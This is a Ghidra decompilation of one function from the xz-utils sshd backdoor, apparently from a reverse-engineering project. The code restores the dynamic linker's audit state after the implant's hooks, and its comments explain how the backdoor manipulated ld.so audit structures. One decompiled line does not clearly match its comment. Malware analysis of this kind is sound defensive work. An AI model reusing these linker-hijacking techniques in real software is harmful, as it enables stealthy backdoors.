// /home/kali/xzre-ghidra/xzregh/102770_init_ldso_ctx.c
// Function: init_ldso_ctx @ 0x102770
// Calling convention: __stdcall
// Prototype: void __stdcall init_ldso_ctx(ldso_ctx_t * ldso_ctx)


/*
 * AutoDoc: Restores every ld.so flag the implant may have touched: it writes the saved auditstate bindflags back to libcrypto/sshd, unsets
 * the copied `l_name` byte, clears the `l_audit_any_plt` bit with the mask recovered earlier, and zeros `_dl_naudit`/`_dl_audit`
 * so the dynamic linker no longer believes an audit module is registered. Stage two calls it on failure paths so sshd resumes with
 * the original ld.so state.
 */

#include "xzre_types.h"

void init_ldso_ctx(ldso_ctx_t *ldso_ctx)

{
  u32 *libcrypto_bindflags_slot;
  byte *sshd_audit_flag_byte;
  
  if (ldso_ctx != (ldso_ctx_t *)0x0) {
    libcrypto_bindflags_slot = ldso_ctx->libcrypto_auditstate_bindflags_ptr;
    if (libcrypto_bindflags_slot != (u32 *)0x0) {
      // AutoDoc: Reapply the saved libcrypto bindflags so ld.so’s audit hooks see their original mask.
      *libcrypto_bindflags_slot = ldso_ctx->libcrypto_auditstate_bindflags_old_value;
      if (ldso_ctx->libcrypto_l_name != (char **)0x0) {
        // AutoDoc: Undo the byte we NUL’d inside `l_name` while the hooks were active.
        *ldso_ctx->libcrypto_l_name = (char *)libcrypto_bindflags_slot;
      }
    }
    if (ldso_ctx->sshd_auditstate_bindflags_ptr != (u32 *)0x0) {
      // AutoDoc: Mirror the same restoration for sshd’s auditstate structure.
      *ldso_ctx->sshd_auditstate_bindflags_ptr = ldso_ctx->sshd_auditstate_bindflags_old_value;
    }
    sshd_audit_flag_byte = (byte *)ldso_ctx->sshd_link_map_l_audit_any_plt_addr;
    if (sshd_audit_flag_byte != (byte *)0x0) {
      // AutoDoc: Clear the `l_audit_any_plt` bit the loader set so `_dl_audit` stops forcing our trampolines.
      *sshd_audit_flag_byte = *sshd_audit_flag_byte & ~ldso_ctx->link_map_l_audit_any_plt_bitmask;
    }
    if (ldso_ctx->_dl_naudit_ptr != (uint *)0x0) {
      // AutoDoc: Drop `_dl_naudit` back to zero so ld.so forgets about the registered audit module.
      *ldso_ctx->_dl_naudit_ptr = 0;
    }
    if (ldso_ctx->_dl_audit_ptr != (audit_ifaces **)0x0) {
      // AutoDoc: NULL out `_dl_audit` as well so future binds can’t reach into freed hook tables.
      *ldso_ctx->_dl_audit_ptr = (audit_ifaces *)0x0;
    }
  }
  return;
}

